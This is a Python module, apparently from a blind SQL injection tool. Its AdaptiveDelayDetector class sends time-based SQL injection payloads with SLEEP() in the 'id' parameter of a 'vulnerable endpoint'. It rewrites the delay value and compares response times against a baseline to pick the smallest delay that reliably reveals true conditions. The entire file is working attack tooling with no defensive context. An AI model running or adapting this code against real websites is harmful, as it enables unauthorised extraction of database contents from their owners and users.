"""
Adaptive delay detection module.
Automatically determines optimal delays based on network conditions.
"""

import time
import statistics
import re
from typing import List, Optional
import requests


class AdaptiveDelayDetector:
    """Automatically detects optimal SQL delay based on network latency."""
    
    def __init__(self, base_url: str, payload_template: str, 
                 initial_delay: float = 1.0):
        """
        Initialize adaptive delay detector.
        
        Args:
            base_url: Base URL of vulnerable endpoint
            payload_template: SQL injection payload template
            initial_delay: Initial delay to test with
        """
        self.base_url = base_url
        self.payload_template = payload_template
        self.optimal_delay: Optional[float] = None
        self.session = requests.Session()
        self.initial_delay = initial_delay
    
    def _measure_baseline_no_delay(self, samples: int = 10) -> List[float]:
        """Measure baseline timing without any delay."""
        timings = []
        payload = self.payload_template.format(condition="1=0")
        
        for _ in range(samples):
            start = time.time()
            try:
                self.session.get(self.base_url, params={'id': payload}, timeout=30)
            except requests.RequestException:
                pass
            timings.append(time.time() - start)
        
        return timings
    
    def _measure_with_delay(self, delay: float, samples: int = 5) -> List[float]:
        """Measure timing with a specific delay."""
        timings = []
        
        # Replace any hardcoded SLEEP() delay in the template with our test delay
        # Pattern: SLEEP(any_number) -> SLEEP(delay)
        payload_template = re.sub(
            r'SLEEP\([0-9.]+\)',
            f'SLEEP({delay})',
            self.payload_template,
            flags=re.IGNORECASE
        )
        
        # Use a condition that's always true (1=1) to trigger the delay
        payload = payload_template.format(condition="1=1")
        
        for _ in range(samples):
            start = time.time()
            try:
                self.session.get(self.base_url, params={'id': payload}, timeout=30)
            except requests.RequestException:
                pass
            timings.append(time.time() - start)
        
        return timings
    
    def detect_optimal_delay(self, min_delay: float = 0.5, 
                            max_delay: float = 5.0,
                            step: float = 0.5) -> float:
        """
        Detect optimal delay by testing different values.
        
        Args:
            min_delay: Minimum delay to test
            max_delay: Maximum delay to test
            step: Step size for delay testing
            
        Returns:
            Optimal delay value
        """
        print("[*] Detecting optimal delay based on network conditions...")
        
        baseline = self._measure_baseline_no_delay()
        baseline_mean = statistics.mean(baseline)
        baseline_std = statistics.stdev(baseline) if len(baseline) > 1 else 0
        
        # Need delay to be significantly above baseline noise
        min_detectable_delay = baseline_mean + (3 * baseline_std)
        
        # Test different delay values
        test_delays = []
        current_delay = min_delay
        
        while current_delay <= max_delay:
            test_timings = self._measure_with_delay(current_delay)
            test_mean = statistics.mean(test_timings)
            
            # Check if delay is reliably detectable
            if test_mean > min_detectable_delay * 1.5:
                test_delays.append((current_delay, test_mean - baseline_mean))
            
            current_delay += step
        
        if not test_delays:
            # Fallback to initial delay
            optimal = self.initial_delay
            print(f"[!] Could not reliably detect delay, using {optimal}s")
        else:
            # Use the smallest delay that's reliably detectable
            optimal = min(test_delays, key=lambda x: x[0])[0]
            print(f"[+] Optimal delay detected: {optimal}s")
        
        self.optimal_delay = optimal
        return optimal
    
    def get_optimal_delay(self) -> float:
        """Get the optimal delay (detects if not already done)."""
        if self.optimal_delay is None:
            self.detect_optimal_delay()
        return self.optimal_delay

